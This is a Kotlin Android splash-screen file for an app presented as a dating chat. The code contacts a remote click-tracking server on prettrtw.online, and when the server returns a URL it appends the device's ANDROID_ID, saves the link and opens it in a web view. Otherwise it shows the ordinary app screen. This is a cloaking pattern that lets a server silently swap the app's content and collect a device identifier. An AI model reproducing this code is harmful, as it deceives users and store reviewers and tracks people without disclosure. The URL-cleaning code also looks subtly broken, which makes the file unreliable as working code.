package livedaitingchat.online.mem

import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.preference.PreferenceManager
import android.provider.Settings
import android.util.Log
import com.github.kittinunf.fuel.httpGet
import com.github.kittinunf.result.Result
import com.yandex.metrica.YandexMetrica
import org.jsoup.Jsoup
import org.jsoup.nodes.Document
import org.jsoup.select.Elements

class SplashActivity : AppCompatActivity() {
    private var isWifi = false
    private var isMobile = false

    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)
        checkNetwork()

    }

    override fun onResume() {
        super.onResume()
        val lastUrl = PreferenceManager.getDefaultSharedPreferences(applicationContext).getString(
            "url",
            PreferenceManager.getDefaultSharedPreferences(this).getString("param", "")
        )
        if (!lastUrl.isNullOrEmpty()) {
            startActivity(Intent(this, MainWebActivity::class.java))
            finish()
        } else if (getFeileno()) {
            startActivity(Intent(this, MainActivity::class.java))
            finish()
        } else {
            val httpAsync = "https://prettrtw.online/click.php?key=gekn3212l9b98fru40qw&t1=livedaitingchat.online.mem"
                .httpGet()
                .timeout(20000)
                .header("Content-Type", "application/json; utf-8")
                .responseString { _, _, result ->
                    when (result) {
                        is Result.Failure -> {
                            Log.e("Error", "response error ${result.getException()}")
                            startActivity(Intent(this, SplashActivity::class.java))
                            finish()
                        }
                        is Result.Success -> {
                            val data = result.get()
                            //  Log.e("url", data)
                            println(data)
                            val document: Document = Jsoup.parse(data)
                            val elements: Elements = document.select("body")

                            if (elements.toString().contains("url")) {
                                var url =
                                    elements.toString()
                                        .substringAfter("url\":\"")
                                        .substringBefore("\"}")
                                        .replace("/", "")
                                        .replace("amp;", "")


                                Log.e("Error", url)
                                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                                YandexMetrica.setUserProfileID(deviceId)

                                url += "livedaitingchat.online.mem&t3=$deviceId"
                                setParametr(url)
                                Log.e("Error", url)
                                startActivity(Intent(this, MainWebActivity::class.java))
                                finish()
                            } else {
                                setFeileno(true)
                                startActivity(Intent(this, MainActivity::class.java))
                                finish()
                            }
                        }
                    }
                }

            setFirst(false)
            httpAsync.join()
        }

    }

    private fun setParametr(value: String) {
        val editor = PreferenceManager.getDefaultSharedPreferences(this).edit()
        editor.putString("param", "$value")
        editor.apply()
    }

    fun setFeileno(value: Boolean) {
        val editor = PreferenceManager.getDefaultSharedPreferences(this).edit()
        editor.putBoolean("Feileno", value)
        editor.apply()
    }
    private fun getFeileno() =
        PreferenceManager.getDefaultSharedPreferences(applicationContext).getBoolean("Feileno", false)

    fun setFirst(value: Boolean) {
        val editor = PreferenceManager.getDefaultSharedPreferences(this).edit()
        editor.putBoolean("first", value)
        editor.apply()
    }

    private fun getUzhebyl() =
        PreferenceManager.getDefaultSharedPreferences(applicationContext).getBoolean("Uzhebyl", false)

    private fun checkNetwork() {
        val connectivityManager =
            getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = connectivityManager.activeNetworkInfo

        if (network != null && network.isConnected) {
            isWifi = network.type == ConnectivityManager.TYPE_WIFI
            isMobile = network.type == ConnectivityManager.TYPE_MOBILE
        }
    }
}